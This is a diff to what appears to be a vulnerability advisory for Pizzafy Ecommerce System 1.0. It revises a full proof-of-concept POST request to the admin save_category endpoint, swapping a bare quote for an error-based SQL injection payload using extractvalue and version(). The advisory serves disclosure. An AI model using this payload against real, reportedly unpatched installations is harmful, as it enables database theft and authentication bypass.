@@ -8,10 +8,10 @@
 - **Status:** Unpatched  
 
 ## **Vulnerable Endpoint:**  
-- `admin/ajax.php?action=save_category`
+- `pizzafy/admin/ajax.php?action=save_category`
 
 ## **Overview**
-The Pizzafy Ecommerce System 1.0 contains multiple SQL Injection vulnerabilities that allow an attacker to extract sensitive data, bypass authentication, and get records from the database.
+The Pizzafy Ecommerce System 1.0 contains SQL Injection vulnerabilities that allow an attacker to extract sensitive data, bypass authentication, and get records from the database.
 
 ## **Vulnerability Description:**  
 # Error-Based SQL Injection Vulnerability
@@ -62,12 +62,12 @@ function save_category(){
 Below is a **POST** request demonstrating the vulnerability using a **Error-Based SQL injection payload**:  
 
 ```
-POST /pizza/admin/ajax.php?action=save_category HTTP/1.1
+POST /pizzafy/admin/ajax.php?action=save_category HTTP/1.1
 Host: localhost
-Content-Length: 242
+Content-Length: 286
 sec-ch-ua: 
 Accept: */*
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTgJxQBXajmMnccmX
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryb6Y1dJ7qqPcyPe2H
 X-Requested-With: XMLHttpRequest
 sec-ch-ua-mobile: ?0
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
@@ -76,22 +76,21 @@ Origin: http://localhost
 Sec-Fetch-Site: same-origin
 Sec-Fetch-Mode: cors
 Sec-Fetch-Dest: empty
-Referer: http://localhost/pizza/admin/index.php?page=categories
+Referer: http://localhost/pizzafy/admin/index.php?page=categories
 Accept-Encoding: gzip, deflate
 Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
-Cookie: PHPSESSID=fvkkm43h4pnc6r6khno620js83
+Cookie: __SRMS__logged=2; __SRMS__key=206b8e5962b2c723e98fba4bbeec7eaaec379ecee8f8d585d60cb304bf6d87ec; PHPSESSID=cibugvssqjpg73n0grv4fbg9lf
 Connection: close
 
-------WebKitFormBoundaryTgJxQBXajmMnccmX
+------WebKitFormBoundaryb6Y1dJ7qqPcyPe2H
 Content-Disposition: form-data; name="id"
 
 1
-------WebKitFormBoundaryTgJxQBXajmMnccmX
+------WebKitFormBoundaryb6Y1dJ7qqPcyPe2H
 Content-Disposition: form-data; name="name"
 
-Pizza'
-------WebKitFormBoundaryTgJxQBXajmMnccmX--
-
+name: test10' OR extractvalue(1, concat(0x7e, version())) -- 
+------WebKitFormBoundaryb6Y1dJ7qqPcyPe2H--
 ```
 
 ### **Explanation:**  
@@ -101,7 +100,7 @@ This payload injects the SQL command:
 ------WebKitFormBoundaryTgJxQBXajmMnccmX
 Content-Disposition: form-data; name="name"
 
-Pizza'
+name: test10' OR extractvalue(1, concat(0x7e, version())) --
 ------WebKitFormBoundaryTgJxQBXajmMnccmX--
 ```
 This makes it possible to get data from the database.
@@ -110,7 +109,7 @@ This makes it possible to get data from the database.
 
 ## Image
 
-- ![](https://i.imgur.com/DHsxEH4.png)
+- ![](https://i.imgur.com/GeJZUb2.png)
 ---
 
 ## Remediation
